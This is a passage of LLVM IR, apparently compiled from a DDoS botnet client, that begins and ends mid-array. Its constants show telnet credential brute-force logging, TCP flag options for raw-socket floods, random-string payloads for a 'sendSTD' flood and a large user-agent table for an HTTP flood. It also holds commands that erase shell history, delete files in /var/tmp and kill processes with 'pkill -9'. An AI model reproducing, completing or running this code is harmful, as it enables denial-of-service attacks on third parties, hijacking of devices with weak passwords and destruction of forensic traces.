-1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.132 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.133 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.136 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.137 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [99 x i8] c"\1B[0;36mHUMAN ATTEMPT | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@.str.139 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.140 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.141 = private unnamed_addr constant [96 x i8] c"\1B[0;36mHUMAN SENT | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@.str.142 = private unnamed_addr constant [98 x i8] c"\1B[0;36mHUMAN FAILED | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@.str.143 = private unnamed_addr constant [99 x i8] c"\1B[0;36mHUMAN SUCCESS | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.179, i32 0, i32 0)], align 16
@.str.144 = private unnamed_addr constant [6 x i8] c"arfgG\00", align 1
@.str.145 = private unnamed_addr constant [9 x i8] c"HBiug655\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"KJYDFyljf754\00", align 1
@.str.147 = private unnamed_addr constant [20 x i8] c"LIKUGilkut769458905\00", align 1
@.str.148 = private unnamed_addr constant [17 x i8] c"JHFDSkgfc5747694\00", align 1
@.str.149 = private unnamed_addr constant [12 x i8] c"GJjyur67458\00", align 1
@.str.150 = private unnamed_addr constant [12 x i8] c"RYSDk747586\00", align 1
@.str.151 = private unnamed_addr constant [12 x i8] c"HKJGi5r8675\00", align 1
@.str.152 = private unnamed_addr constant [10 x i8] c"KHGK7985i\00", align 1
@.str.153 = private unnamed_addr constant [11 x i8] c"yuituiILYF\00", align 1
@.str.154 = private unnamed_addr constant [14 x i8] c"GKJDghfcjkgd4\00", align 1
@.str.155 = private unnamed_addr constant [12 x i8] c"uygtfgtrevf\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"tyeuhygbtfvg\00", align 1
@.str.157 = private unnamed_addr constant [9 x i8] c"ewqdcftr\00", align 1
@.str.158 = private unnamed_addr constant [16 x i8] c"trbazetghhnbrty\00", align 1
@.str.159 = private unnamed_addr constant [11 x i8] c"tbhrwsehbg\00", align 1
@.str.160 = private unnamed_addr constant [12 x i8] c"twehgbferhb\00", align 1
@.str.161 = private unnamed_addr constant [12 x i8] c"etrbhhgetrb\00", align 1
@.str.162 = private unnamed_addr constant [14 x i8] c"edfverthbyrtb\00", align 1
@.str.163 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.164 = private unnamed_addr constant [14 x i8] c"zcdbvgdfsbgfd\00", align 1
@.str.165 = private unnamed_addr constant [10 x i8] c"gdfbtsdgb\00", align 1
@.str.166 = private unnamed_addr constant [14 x i8] c"ghdugffytsdyt\00", align 1
@.str.167 = private unnamed_addr constant [14 x i8] c"tgerthgwtrwry\00", align 1
@.str.168 = private unnamed_addr constant [12 x i8] c"yteytietyue\00", align 1
@.str.169 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.170 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.171 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.172 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.173 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.174 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.175 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.176 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.177 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.178 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.179 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.180 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.181 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.182 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.183 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.184 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.185 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.186 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.187 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.188 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.189 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.190 = private unnamed_addr constant [10 x i8] c"pkill -9 \00", align 1
@.str.191 = private unnamed_addr constant [11 x i8] c"pkill -9 \22\00", align 1
@.str.193 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.194 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@.str.195 = private unnamed_addr constant [21 x i8] c"cd /var/tmp; rm -f *\00", align 1
@sendHTTP.useragents = private unnamed_addr constant [649 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.302, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.303, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.306, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.307, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.308, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.313, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([160 x i8], [160 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([130 x i8], [130 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* 